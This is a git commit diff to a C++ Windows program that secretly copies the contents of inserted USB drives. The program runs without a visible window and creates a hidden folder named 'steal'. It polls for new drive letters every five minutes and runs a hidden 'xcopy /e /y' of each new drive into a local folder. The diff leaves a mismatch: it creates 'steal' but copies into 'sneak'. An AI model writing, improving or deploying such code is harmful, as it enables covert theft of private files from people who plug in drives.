3dbf55bf19a2f90258cfd12d2e4bc74961847c80
oldnumber18 <117345554+oldnumber18@users.noreply.github.com>
2024-06-07 23:56:59 +0800

    Update c++_U.cpp

--- c++_U.cpp
+++ c++_U.cpp
@@ -1,8 +1,11 @@
+#define Relese
 #include <Windows.h>
 #include <time.h>
 #include <stdio.h>
 #include <io.h>
+#ifndef DEBUG
 #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+#endif
 #pragma warning (disable : 4996)//关闭4996警告
 #pragma warning (disable : 28159)
 const char sys[] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z' };
@@ -19,34 +22,37 @@ void fileA(int a,int win_A,int win_B) {
 int main(){
 	DWORD win_A = GetLogicalDrives();
 	int a[26] = { 0 }, b[26] = {0};
-	char str[50];
-	if (!access("./sneak", 0)) {// 如果sneak文件夹存在
-		if (access("./log.txt", 0)) {// 如果log.txt文件不存在，则证明初始化
-			system("Attrib +h sneak");// 隐藏sneak文件
-			system("cd.>log.txt");
-			fileA(1, NULL, NULL);
-		}
-		while (1) {
-			DWORD win_B = GetLogicalDrives();
-			if (win_A != win_B) {
-				for (int num = 0; win_A > 0; ++num) {
-					a[num] = win_A % 2;
-					win_A /= 2;
-				}
-				for (int num = 0; win_B > 0; ++num)
-				{
-					b[num] = win_B % 2;
-					win_B /= 2;
-					if (a[num] != b[num]) {
-						sprintf(str, "xcopy %c: .\\sneak /e /y /d", sys[num]);
-						WinExec(str, SW_HIDE);
-						fileA(2, win_A, win_B);
-					}
+	if (access("log.txt", 0)) {
+		system("md steal && Attrib +h steal && cd.>log.txt");
+		MessageBox(NULL, L"初始化成功", L"STEAL", MB_OK);
+	}
+	while (1) {
+		DWORD win_B = GetLogicalDrives();
+		if (win_B != win_A) {
+			char str[50];
+			for (int num = 0; win_A > 0; ++num) {
+				a[num] = win_A % 2;
+				win_A /= 2;
+			}
+			for (int num = 0; win_B > 0; ++num)
+			{
+				b[num] = win_B % 2;
+				win_B /= 2;
+				if (a[num] != b[num]) {
+					sprintf(str, "xcopy %c: .\\sneak /e /y /d", sys[num]);
+#ifdef DEBUG
+					printf("执行指令:%s\n", str);
+#else
+					WinExec(str, SW_HIDE);
+#endif // DEBUG
+					fileA(2, win_A, win_B);
 				}
 			}
-			Sleep(300000);//五分钟
 		}
+#ifdef DEBUG
+		Sleep(1000);
+#else
+		Sleep(300000);//五分钟
+#endif // DEBUG
 	}
-	system("msg /server 127.0.0.1 * \"NO HAVE FLIE:sneak\"");
-	return 0;
 }
